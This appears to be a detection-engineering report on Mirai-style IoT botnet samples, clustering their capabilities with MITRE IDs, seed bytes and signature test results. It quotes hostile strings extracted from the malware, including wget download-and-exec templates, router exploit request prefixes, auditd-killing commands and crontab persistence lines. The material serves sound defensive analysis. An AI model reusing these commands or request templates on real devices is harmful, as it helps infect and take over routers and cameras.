- [xor54] `'z5:=91T'` decoded `.anime` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> '.anime'
- [xor54] `"{6=:{6!'-6;,t?=88tymtT"` decoded `/bin/busybox kill -9 ` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> '/bin/busybox kill -9 '
- [xor54] `':591\'1&"1&tT'` decoded `nameserver ` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> 'nameserver '
- [xor54] `'{01"{#5 7<0;3T'` decoded `/dev/watchdog` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> '/dev/watchdog'

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073888733 (table_init, 14 members, coh 0.93)
- ARM: cl 1073888733 (table_init, 14 members, coh 0.93)
- x86:32: cl 1073888733 (table_init, 14 members, coh 0.93)
- SuperH4: cl 1073888733 (table_init, 14 members, coh 0.93)

Seed bytes (cluster 1073888733):

- ARM:LE:32:v8 w16 cov=0.5: `{ f0 4f 2d e9 02 00 a0 e3 04 d0 4d e2 5c 06 00 eb }`
- MIPS:BE:32:default w16 cov=0.667: `{ 3c 1c 00 05 27 9c d9 f0 03 99 e0 21 27 bd ff c0 }`

Test one-string `":7;&&17 T"`: tp=22 fn=0 fp=11 (total hits 33)
Test any-of 5 anchors: tp=22 fn=0 fp=11

Rule hint: Distinct from 0x22 family: only 22 files; encoded '.anime' + 'ncorrect' pair is an exclusive pair.

## Telnet brute-force scanner module

`telnet_scanner_bruteforce`  MITRE: T1110.001, T1595.001, T1021  holders: **21**

scanner_init/scanner_thread/scanner_kill (+ adb/huawei/realtek/dlink scanner_init variants); telnet-brute log tags.

Arches: {'ARM': 15, 'MIPS:32': 4, 'AARCH64': 2}  
Name stems: {'MD5MD5': 9, 'MD5.unpacked': 6, 'nuclear': 2, 'DEMONS': 2, '': 1, 'MD5MD5.elf': 1}

Evidence:

- [string] `'telnet-brute'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'%s|%s|telnet-brute'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} result record format
- [string] `'/usr/sbin/telnetd'` files=18 arches={'ARM': 6, 'MIPS:32': 4, 'x86:32': 3, 'PowerPC': 2} 

Function clusters (named, unstripped builds):

- cl 1073831954 `scanner_kill` members=27 files=9 coh=1.0 arch={'ARM': 9}
- cl 1073853775 `scanner_thread` members=4 files=4 coh=1.0 arch={'ARM': 4}
- cl 1073856098 `scanner_init` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073834094 `scanner_thread` members=2 files=2 coh=1.0 arch={'MIPS:32': 2}
- cl 1073831955 `realtek_scanner_init` members=2 files=1 coh=1.0 arch={'ARM': 1}

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073766844 (scanner_thread, 2 members, coh 1.0)
- ARM: cl 1073853775 (scanner_thread, 4 members, coh 1.0)
- AARCH64: cl 1073837948 (scanner_thread, 2 members, coh 1.0)

Seed bytes (cluster 1073831954):

- ARM:LE:32:v8 w16 cov=1.0: `{ 04 e0 2d e5 18 30 9f e5 04 d0 4d e2 00 00 93 e5 }`

Test one-string `"telnet-brute"`: tp=10 fn=11 fp=0 (total hits 10)
Test any-of 2 anchors: tp=10 fn=11 fp=0

Rule hint: Code clusters in ARM (scanner_thread cohesion?); telnet-brute strings only in the od_* family.

## 0clKiller: kill other bots via /proc maps/exe/stat

`competitor_killer_0cl`  MITRE: T1562, T1057, T1489  holders: **48**

Scans /proc/*/{maps,exe,stat} and kills processes (competing malware), logs '[0clKiller*] Killed Process'.

Arches: {'ARM': 15, 'MIPS:32': 10, 'x86:32': 9, '68000': 4, 'SuperH4': 3, 'PowerPC': 3, 'x86:64': 3, 'sparc': 1}  
Name stems: {'p': 31, 'MD5.unpacked': 16, 'MD5': 1}

Evidence:

- [string] `'[0clKillerMaps] Killed Process: %s, PID: %d\n'` files=48 arches={'ARM': 15, 'MIPS:32': 10, 'x86:32': 9, '68000': 4} 
- [string] `'[0clKillerKillerEXE] Killed process: %s, PID: %d\n'` files=48 arches={'ARM': 15, 'MIPS:32': 10, 'x86:32': 9, '68000': 4} 
- [string] `'[0clKillerStat] Killed Process: %s, PID: %d\n'` files=40 arches={'ARM': 15, 'x86:32': 9, '68000': 4, 'SuperH4': 3} 
- [string] `'/proc/%d/maps'` files=53 arches={'ARM': 15, 'MIPS:32': 11, 'x86:32': 10, 'SuperH4': 4} generic but co-located
- [string] `'/proc/%d/stat'` files=51 arches={'ARM': 15, 'MIPS:32': 11, 'x86:32': 10, 'x86:64': 4} 

Function clusters (named, unstripped builds):

- cl 1073884791 `killer_init` members=29 files=29 coh=1.0 arch={'ARM': 11, 'SuperH4': 3, 'PowerPC': 3, 'MIPS:32': 3, 'x86:64': 3, 'x86:32': 6}
- cl 1073831954 `scanner_kill` members=27 files=9 coh=1.0 arch={'ARM': 9}
- cl 1073882187 `killer_mirai_exists` members=11 files=11 coh=1.0 arch={'ARM': 11}
- cl 1073889199 `killer_mirai_init` members=10 files=10 coh=0.97 arch={'ARM': 10}
- cl 1073878086 `FUN_0040b1c0` members=7 files=7 coh=1.0 arch={'MIPS:32': 7}

Cluster holding the anchor string, per arch:

- ARM: cl 1073844836 (killer_maps, 6 members, coh 1.0)
- 68000: cl 1073755045 (FUN_80005628, 2 members, coh 1.0)
- MIPS:32: cl 1073881003 (FUN_00407844, 7 members, coh 1.0)
- PowerPC: cl 1073789861 (FUN_10005788, 2 members, coh 1.0)
- x86:32: cl 1073889347 (FUN_0804d1e0, 4 members, coh 0.93)
- SuperH4: cl 1073842075 (FUN_00404c00, 2 members, coh 1.0)
- x86:64: cl 1073803497 (FUN_00405570, 2 members, coh 1.0)

Seed bytes (cluster 1073884791):

- ARM:LE:32:v8 w16 cov=0.75: `{ 00 eb 00 00 50 e3 02 00 00 da 04 d0 8d e2 04 e0 }`
- MIPS:BE:32:default w16 cov=1.0: `{ 27 bd ff e0 8f 99 80 b4 af bc 00 10 af bf 00 1c }`

Test one-string `{ 5b 30 63 6c 4b 69 6c 6c 65 72 4d 61 70 73 5d 20 4b 69 6c 6c 65 64 20`: tp=48 fn=0 fp=0 (total hits 48)
Test any-of 3 anchors: tp=48 fn=0 fp=0

Rule hint: Strongest cross-arch anchor in the collection (48 files, 15 ARM/10 MIPS/9 x86/m68k/PPC/SH4).

## Process / port killer (pkill, killall, killer_kill_by_port, memory scan)

`competitor_killer_by_name_port`  MITRE: T1562.001, T1489  holders: **33**

killer_kill_by_port, killer_mirai_exists/init, '[killer] killed mirai', pkill/killall command lines, auditctl/snoop kill.

Arches: {'ARM': 23, 'MIPS:32': 4, 'AARCH64': 2, 'SuperH4': 2, 'PowerPC': 1, 'x86:32': 1}  
Name stems: {'MD5MD5': 10, 'p': 8, 'MD5.unpacked': 6, 'DEMONS': 2, 'nuclear': 2, 'MD5MD5.elf': 2, 'Josho': 2, 'MD5': 1}

Evidence:

- [string] `'[killer] killed: %s (pid: %d) exe: %s\n'` files=2 arches={'PowerPC': 1, 'SuperH4': 1} josho
- [string] `'[killer] killed mirai (pid: %d)\n'` files=2 arches={'PowerPC': 1, 'SuperH4': 1} 
- [string] `'[killer] starting memory scan on (pid=%d)\n'` files=1 arches={'x86:32': 1} 
- [string] `'pkill -9 -x %s 2>/dev/null &'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} od_ family
- [string] `'pkill -9 -f [%c]%s 2>/dev/null &'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'auditctl -e 0 2>/dev/null &pkill -9 [a]uditd 2>/dev/null &pkill -9 -f '` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} disables auditd/snoop
- [string] `'killall -9 telnetd utelnetd scfgmgr'` files=1 arches={'ARM': 1} 
- [string] `"[watch_time] kill() pid: ('%d'), exit()\n"` files=11 arches={'MIPS:32': 5, 'ARM': 2, '68000': 1, 'x86:32': 1} self-timeout watchdog

Function clusters (named, unstripped builds):

- cl 1073882187 `killer_mirai_exists` members=11 files=11 coh=1.0 arch={'ARM': 11}
- cl 1073889199 `killer_mirai_init` members=10 files=10 coh=0.97 arch={'ARM': 10}
- cl 1073844834 `killer_exe` members=6 files=6 coh=1.0 arch={'ARM': 6}
- cl 1073844836 `killer_maps` members=6 files=6 coh=1.0 arch={'ARM': 6}
- cl 1073844835 `killer_stat` members=6 files=6 coh=1.0 arch={'ARM': 6}

Cluster holding the anchor string, per arch:


Seed bytes (cluster 1073882187):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 41 2d e9 01 2a a0 e3 42 dd 4d e2 02 80 8d e0 }`

Test one-string `{ 5b 6b 69 6c 6c 65 72 5d 20 6b 69 6c 6c 65 64 3a 20 25 73 20 28 70 69`: tp=2 fn=31 fp=0 (total hits 2)
Test any-of 7 anchors: tp=14 fn=19 fp=0

Rule hint: Fragmented across 4+ families; write per-family rules.

## /dev/watchdog opened to prevent reboot

`hardware_watchdog_keepalive`  MITRE: T1562, T1496  holders: **63**

Opens /dev/watchdog and /dev/misc/watchdog (Mirai keeps it fed / disabled so the device does not reboot).

Arches: {'ARM': 24, 'x86:32': 13, 'MIPS:32': 11, 'PowerPC': 4, '68000': 4, 'x86:64': 3, 'AARCH64': 2, 'MIPS:64': 1, 'sparc': 1}  
Name stems: {'p': 26, 'MD5.unpacked': 11, 'MD5': 11, 'MD5MD5': 10, 'MD5MD5.elf': 3, '': 2}

Evidence:

- [string] `'/dev/watchdog'` files=63 arches={'ARM': 24, 'x86:32': 13, 'MIPS:32': 11, 'PowerPC': 4} plain
- [string] `'/dev/misc/watchdog'` files=63 arches={'ARM': 24, 'x86:32': 13, 'MIPS:32': 11, 'PowerPC': 4} plain
- [string] `'/bin/watchdog'` files=12 arches={'ARM': 5, 'x86:32': 2, 'AARCH64': 1, 'SuperH4': 1} 
- [xor22] `'\rFGT\rUCVAJFME"'` decoded `/dev/watchdog` files=49 arches={'ARM': 16, 'MIPS:32': 12, 'x86:32': 8, 'x86:64': 4} xor22-encoded
- [xor54] `'{01"{#5 7<0;3T'` decoded `/dev/watchdog` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} xor54-encoded

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073887030 (evade_bg, 4 members, coh 0.97)
- ARM: cl 1073844839 (FUN_0000d61c, 3 members, coh 1.0)
- 68000: cl 1073755020 (FUN_800000b4, 2 members, coh 1.0)
- PowerPC: cl 1073789864 (FUN_10005c50, 2 members, coh 1.0)
- x86:32: cl 1073883899 (FUN_080480c0, 2 members, coh 1.0)
- AARCH64: cl 1073837945 (evade_bg, 2 members, coh 1.0)
- x86:64: cl 1073886310 (FUN_00400150, 4 members, coh 0.99)

Seed bytes (cluster 1073887030):

- MIPS:BE:32:default w16 cov=1.0: `{ 3c 1c 00 10 27 9c d6 ec 03 99 e0 21 27 bd f7 40 }`
- MIPS:LE:32:default w16 cov=1.0: `{ 10 00 1c 3c 2c e2 9c 27 21 e0 99 03 40 f7 bd 27 }`

Test one-string `"/dev/watchdog"`: tp=63 fn=0 fp=14 (total hits 77)
Test any-of 2 anchors: tp=63 fn=0 fp=14

Rule hint: Weak alone (also in busybox/libc consumers); use as one of N.

## Single-instance lock file

`single_instance_lock`  MITRE: T1480  holders: **18**

Lock file /tmp/.bot_lock and ensure_single_instance().

Arches: {'AARCH64': 2, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2, 'RISCV:32': 2, 'x86:32': 2, 'RISCV:64': 2, 'Loongarch': 2, 'x86:64': 2}  
Name stems: {'MD5.unpacked': 10, 'xnxnxnxnxnxnxnxn': 6, 'xnxnxnxnxnxnxnxnloon': 2}

Evidence:

- [string] `'/tmp/.bot_lock'` files=18 arches={'AARCH64': 2, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2} 

Function clusters (named, unstripped builds):

- cl 1073888696 `ensure_single_instance` members=14 files=14 coh=0.96 arch={'ARM': 13, 'MIPS:32': 1}

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073742271 (FUN_00400140, 2 members, coh 1.0)
- RISCV:64: cl 1073793041 (FUN_ram_00010158, 2 members, coh 1.0)
- Loongarch: cl 1073887623 (FUN_ram_120000140, 4 members, coh 0.96)
- AARCH64: cl 1073781316 (FUN_00400140, 2 members, coh 1.0)
- RISCV:32: cl 1073779067 (FUN_ram_000100d4, 2 members, coh 1.0)
- x86:64: cl 1073808333 (FUN_00401040, 2 members, coh 1.0)
- 68000: cl 1073790940 (FUN_800000b4, 2 members, coh 1.0)
- PowerPC: cl 1073861910 (FUN_100000e0, 2 members, coh 1.0)

Seed bytes (cluster 1073888696):

- ARM:LE:32:v8 w24 cov=1.0: `{ e5 03 10 a0 e3 00 20 a0 e3 04 00 a0 e1 ?? ?? 00 eb 05 10 a0 e1 02 2b 80 }`

Test one-string `"/tmp/.bot_lock"`: tp=18 fn=0 fp=5 (total hits 23)

Rule hint: 18 files, riscv/loongarch/m68k/PPC/x86/x64/SH4; excellent narrow anchor.

## Persistence: S99ksync init script / cron.d / android .ksync.sh

`persistence_ksync_initd_cron`  MITRE: T1037, T1053.003, T1543  holders: **6**

Writes /etc/init.d/S99ksync, /etc/cron.d/ksync, /data/local/.ksync.sh and an @reboot cron line.

Arches: {'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1}  
Name stems: {'MD5MD5': 6}

Evidence:

- [string] `'/etc/init.d/S99ksync'` files=6 arches={'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1} 
- [string] `'/etc/cron.d/ksync'` files=6 arches={'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1} 
- [string] `'/data/local/.ksync.sh'` files=6 arches={'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1} 
- [string] `'boot hook .ksync.sh'` files=6 arches={'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1} 
- [string] `'update-rc.d S99ksync defaults 2>/dev/null || chkconfig --add S99ksync '` files=6 arches={'ARM': 3, 'MIPS:32': 1, '68000': 1, 'PowerPC': 1} 

Cluster holding the anchor string, per arch:


Test one-string `"/etc/init.d/S99ksync"`: tp=6 fn=0 fp=1 (total hits 7)
Test any-of 3 anchors: tp=6 fn=0 fp=1

Rule hint: 6 files, exact family ('ksync'); any 2 strings.

## Persistence: crontab entry re-copying /tmp/.z

`persistence_crontab_tmp_z`  MITRE: T1053.003, T1037.004  holders: **12**

crontab */5 * * * * {[ -x /tmp/.z ] || cp /var/.z ...}; also /etc/rc.local.

Arches: {'ARM': 5, 'MIPS:32': 4, 'AARCH64': 3}  
Name stems: {'MD5MD5': 11, 'MD5MD5.elf': 1}

Evidence:

- [string] `"(crontab -l 2>/dev/null; echo '*/5 * * * * { [ -x /tmp/.z ] || cp /var"` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/tmp/.z'` files=12 arches={'ARM': 5, 'MIPS:32': 4, 'AARCH64': 3} 
- [string] `'/etc/rc.local'` files=10 arches={'ARM': 4, 'MIPS:32': 2, 'x86:64': 2, '68000': 1} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073887030 (evade_bg, 4 members, coh 0.97)
- ARM: cl 1073853772 (evade_bg, 4 members, coh 1.0)
- AARCH64: cl 1073837945 (evade_bg, 2 members, coh 1.0)

Seed bytes (cluster 1073887030):

- MIPS:BE:32:default w16 cov=1.0: `{ 3c 1c 00 10 27 9c d6 ec 03 99 e0 21 27 bd f7 40 }`
- MIPS:LE:32:default w16 cov=1.0: `{ 10 00 1c 3c 2c e2 9c 27 21 e0 99 03 40 f7 bd 27 }`

Test one-string `"(crontab -l 2>/dev/null; echo '*/5 * * * * { [ -"`: tp=10 fn=2 fp=0 (total hits 10)
Test any-of 2 anchors: tp=12 fn=0 fp=0

Rule hint: od_* family (10 files); /tmp/.z is its drop path.

## Anti-VM / sandbox checks (DMI product_name, VMware, hypervisor, qemu)

`anti_vm_dmi_hypervisor`  MITRE: T1497.001  holders: **32**

Reads /sys/class/dmi/id/product_name and compares to 'VMware'; od_* family also checks /proc/driver/vmware, /sys/hypervisor/type, /proc/sys/qemu_version, 'sandbox'.

Arches: {'MIPS:32': 6, 'ARM': 4, 'AARCH64': 4, 'SuperH4': 4, '68000': 2, 'PowerPC': 2, 'RISCV:32': 2, 'x86:32': 2, 'RISCV:64': 2, 'Loongarch': 2}  
Name stems: {'MD5.unpacked': 10, 'MD5MD5': 9, 'xnxnxnxnxnxnxnxn': 8, 'xnxnxnxnxnxnxnxnsh2x': 2, 'xnxnxnxnxnxnxnxnloon': 2, 'MD5MD5.elf': 1}

Evidence:

- [string] `'/sys/class/dmi/id/product_name'` files=32 arches={'MIPS:32': 6, 'ARM': 4, 'AARCH64': 4, 'SuperH4': 4} 
- [string] `'VMware'` files=32 arches={'MIPS:32': 6, 'ARM': 4, 'AARCH64': 4, 'SuperH4': 4} 
- [string] `'/proc/driver/vmware'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/sys/hypervisor/type'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/proc/sys/qemu_version'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/etc/vmware'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'sandbox'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/sys/class/dmi/id/board_vendor'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073841746 (FUN_00400568, 12 members, coh 1.0)
- RISCV:64: cl 1073861917 (FUN_ram_00010446, 6 members, coh 1.0)
- Loongarch: cl 1073841746 (FUN_00400568, 12 members, coh 1.0)
- AARCH64: cl 1073841746 (FUN_00400568, 12 members, coh 1.0)
- ARM: cl 1073853705 (evade_detect, 4 members, coh 1.0)
- RISCV:32: cl 1073861917 (FUN_ram_00010446, 6 members, coh 1.0)
- x86:64: cl 1073841746 (FUN_00400568, 12 members, coh 1.0)
- 68000: cl 1073790948 (FUN_800005d2, 2 members, coh 1.0)

Seed bytes (cluster 1073841746):

- AARCH64:LE:64:v8A w16 cov=1.0: `{ fe 4f b7 a9 e1 00 00 b0 e0 00 00 b0 21 80 0f 91 }`
- Loongarch:LE:64:lp64d w16 cov=1.0: `{ 63 80 fd 02 65 94 10 18 84 94 10 18 61 60 c2 29 }`

Test one-string `"/sys/class/dmi/id/product_name"`: tp=32 fn=0 fp=0 (total hits 32)
Test any-of 5 anchors: tp=32 fn=0 fp=0

Rule hint: product_name+VMware pair covers 32 files across 10 arches.

## Anti-debug: ptrace detection / strace check

`anti_debug_ptrace_strace`  MITRE: T1622  holders: **7**

Aborts when traced ('[anti-debug] PTRACE DETECTED - EXITING'), checks for strace.

Arches: {'ARM': 4, 'PowerPC': 1, 'x86:64': 1, 'SuperH4': 1}  
Name stems: {'MD5': 3, 'Josho': 2, 'chrome': 1, 'kkk': 1}

Evidence:

- [string] `'[anti-debug] PTRACE DETECTED - EXITING\n'` files=7 arches={'ARM': 4, 'PowerPC': 1, 'SuperH4': 1, 'x86:64': 1} 
- [string] `'strace'` files=17 arches={'ARM': 8, 'MIPS:32': 4, 'AARCH64': 2, 'PowerPC': 1} also libc? 17 files

Cluster holding the anchor string, per arch:

- x86:64: cl 1073886338 (FUN_0000ed10, 3 members, coh 0.99)
- ARM: cl 1073886338 (FUN_0000ed10, 3 members, coh 0.99)
- PowerPC: cl 1073888035 (FUN_00406c60, 2 members, coh 0.93)
- SuperH4: cl 1073888035 (FUN_00406c60, 2 members, coh 0.93)

Seed bytes (cluster 1073886338):


Test one-string `{ 5b 61 6e 74 69 2d 64 65 62 75 67 5d 20 50 54 52 41 43 45 20 44 45 54`: tp=7 fn=0 fp=2 (total hits 9)

Rule hint: First string is the anchor (7 files).

## Multi-CVE router/IoT exploit kit ('od_*' modules)

`router_exploit_kit_od`  MITRE: T1190, T1203, T1105  holders: **10**

Per-vendor exploit senders: GPON, Huawei HG532 (37215), Netgear setup.cgi, HNAP1, TOTOLINK, Zyxel (CVE-2022-30525, 2023-28771), TP-Link 2023-1389, WebLogic CVE-2017-10271, ThinkPHP, Realtek udp9034, Hikvision 36260, tbkdvr, netis 53413, ADB. All drop 'bot.$(uname -m)' via /tmp/.z.

Arches: {'ARM': 4, 'MIPS:32': 4, 'AARCH64': 2}  
Name stems: {'MD5MD5': 9, 'MD5MD5.elf': 1}

Evidence:

- [string] `'[od_gpon] diag ping injection fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_huawei] HG532 upnp rce fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_zygate] cve-2022-30525 fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_weblogic] cve-2017-10271 fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_tplink] 2023-1389 fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_netgear] setup.cgi syscmd at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_hikvision] 36260 fired at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'[od_thinkphp] rce probe at %s:%d\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073853740 (od_zyxelnas_infect.constprop.0, 24 members, coh 1.0)
- ARM: cl 1073853740 (od_zyxelnas_infect.constprop.0, 24 members, coh 1.0)
- AARCH64: cl 1073837913 (od_zyxelnas_infect.constprop.0, 6 members, coh 1.0)

Seed bytes (cluster 1073853740):

- ARM:LE:32:v8 w16 cov=1.0: `{ d8 30 9f e5 f0 40 2d e9 03 30 8f e0 0a dc 4d e2 }`
- MIPS:BE:32:default w16 cov=1.0: `{ 03 99 e0 21 27 bd f5 c8 8f 82 80 3c 8f 87 80 3c }`

Test one-string `{ 5b 6f 64 5f 67 70 6f 6e 5d 20 64 69 61 67 20 70 69 6e 67 20 69 6e 6a`: tp=10 fn=0 fp=0 (total hits 10)
Test any-of 8 anchors: tp=10 fn=0 fp=0

Rule hint: 10 files, 3 arches; the '[od_' prefix is a one-string family anchor, each exploit URL is capability-specific.

## HTTP/SOAP IoT exploits: Tenda goform, Realtek miniigd picsdesc, Linksys tmUnblock, JAWS, shortcut_telnet

`router_exploit_soap_tenda_realtek`  MITRE: T1190, T1105  holders: **9**

TCP_MSGHEAD_CMD shell-command carrier with wget.sh dropper; exploit request templates /goform/set_LimitClient_cfg, /picsdesc.xml, /tmUnblock.cgi, GET /shell?cd..., /cgi-bin/shortcut_telnet.cgi.

Arches: {'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1}  
Name stems: {'MD5': 9}

Evidence:

- [string] `'TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://%u.%u.%u.%u:%u/wget.sh; bu'` files=9 arches={'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1} 
- [string] `'POST /goform/set_LimitClient_cfg HTTP/1.1\r\nHost: %u.%u.%u.%u:%u\r\nConte'` files=9 arches={'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1} tenda
- [string] `'POST /picsdesc.xml HTTP/1.1\r\nHost: %u.%u.%u.%u:%u\r\nContent-Type: text/'` files=8 arches={'ARM': 3, 'x86:32': 3, 'PowerPC': 1, 'MIPS:32': 1} realtek miniigd CVE-2014-8361
- [string] `'POST /tmUnblock.cgi HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-ww'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} linksys
- [string] `'GET /shell?cd%%20%%2Ftmp%%3Brm%%20-rf%%20wget.sh%%3B%%20wget%%20http%%'` files=7 arches={'ARM': 3, 'x86:32': 3, 'PowerPC': 1} jaws
- [string] `'GET /cgi-bin/shortcut_telnet.cgi?cd%%20%%2Ftmp%%3Brm%%20-rf%%20wget.sh'` files=7 arches={'ARM': 3, 'x86:32': 3, 'PowerPC': 1} 

Cluster holding the anchor string, per arch:

- ARM: cl 1073840896 (FUN_00011988, 2 members, coh 1.0)
- x86:32: cl 1073888869 (FUN_000119c0, 2 members, coh 0.91)

Seed bytes (cluster 1073840896):


Test one-string `"TCP_MSGHEAD_CMD cd /tmp/tmpfs/; wget http://%u.%"`: tp=9 fn=0 fp=0 (total hits 9)
Test any-of 3 anchors: tp=9 fn=0 fp=0

Rule hint: 9 files (x86/ARM/MIPS/PPC, all MD5-named); exact request prefixes.

## Self-copy and /proc bind-mount hiding

`self_copy_proc_hide`  MITRE: T1564.001, T1036  holders: **9**

'rm -rf %s;cp %s %s' relocation and 'mount --bind /tmp /proc/%d' to hide the process from /proc.

Arches: {'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1}  
Name stems: {'MD5': 9}

Evidence:

- [string] `'mount --bind /tmp /proc/%d'` files=9 arches={'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1} 
- [string] `'rm -rf %s;cp %s %s'` files=9 arches={'ARM': 3, 'x86:32': 3, 'MIPS:32': 2, 'PowerPC': 1} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073750757 (init_hidden, 2 members, coh 1.0)
- ARM: cl 1073886422 (FUN_00010b28, 3 members, coh 0.98)

Seed bytes (cluster 1073886422):


Test one-string `"mount --bind /tmp /proc/%d"`: tp=9 fn=0 fp=0 (total hits 9)
Test any-of 2 anchors: tp=9 fn=0 fp=0

Rule hint: 9 files, same set as the tenda/realtek exploit family.

## Download-and-exec shell chain (wget / tftp / ftpget / curl / busybox)

`downloader_shell_chain`  MITRE: T1105, T1059.004  holders: **16**

Format-string command lines that try each fetcher: wget URL -O, tftp -c get, tftp -g -r, ftpget anonymous, curl -o.

Arches: {'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, '68000': 1, 'PowerPC': 1, 'x86:64': 1, 'AARCH64': 1, 'SuperH4': 1}  
Name stems: {'MD5.unpacked': 11, 'MD5': 3, 'miniiupnpd': 1, 'upnnpd': 1}

Evidence:

- [string] `'wget http://%s/%s/%s -O %s'` files=16 arches={'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} 
- [string] `'tftp %s -c get %s %s'` files=16 arches={'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} 
- [string] `'cd %s && tftp -g -r %s %s'` files=16 arches={'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} 
- [string] `'ftpget -v -u anonymous -p anonymous -P 21 %s %s %s'` files=16 arches={'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} 
- [string] `'curl -o %s http://%s/%s/%s'` files=16 arches={'MIPS:32': 5, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} 
- [string] `'/bin/busybox'` files=35 arches={'ARM': 11, 'MIPS:32': 7, 'x86:32': 6, 'PowerPC': 3} 35 files, generic

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073879292 (FUN_0040c578, 5 members, coh 1.0)

Seed bytes (cluster 1073879292):

- MIPS:BE:32:default w16 cov=1.0: `{ 03 99 e0 21 27 bd fc 68 af bf 03 94 af be 03 90 }`
- MIPS:LE:32:default w16 cov=0.667: `{ db 9c 27 21 e0 99 03 68 fc bd 27 94 03 bf af 90 }`

Test one-string `"wget http://%s/%s/%s -O %s"`: tp=16 fn=0 fp=0 (total hits 16)
Test any-of 5 anchors: tp=16 fn=0 fp=0

Rule hint: 5 command templates co-occur in 16 files (MD5.unpacked set): 3 of 5 is a clean rule.

## DVR/HiSilicon firmware dropper shell + cstecgi telnet enabler

`busybox_cstecgi_dvr_dropper_sh`  MITRE: T1190, T1105  holders: **10**

Embedded /dvr script (rm fwr, busybox wget) and TOTOLINK cstecgi.cgi telnet-enable requests.

Arches: {'ARM': 4, 'MIPS:32': 4, 'AARCH64': 2}  
Name stems: {'MD5MD5': 9, 'MD5MD5.elf': 1}

Evidence:

- [string] `'#!/bin/sh\ncd /dvr\nrm -f /dvr/fwr /dvr/fwr_ver /dvr/fwr.tmp\n/bin/busybo'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'GET /cgi-bin/cstecgi.cgi?action=telnet&enable=1&password=%s&code=%s HT'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'/dvr/upgrade'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073766849 (od_3r_infect.constprop.0, 2 members, coh 1.0)
- ARM: cl 1073853780 (od_3r_infect.constprop.0, 4 members, coh 1.0)
- AARCH64: cl 1073837953 (od_3r_infect.constprop.0, 2 members, coh 1.0)

Seed bytes (cluster 1073853780):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 47 2d e9 00 20 a0 e3 7e de 4d e2 00 60 a0 e1 }`

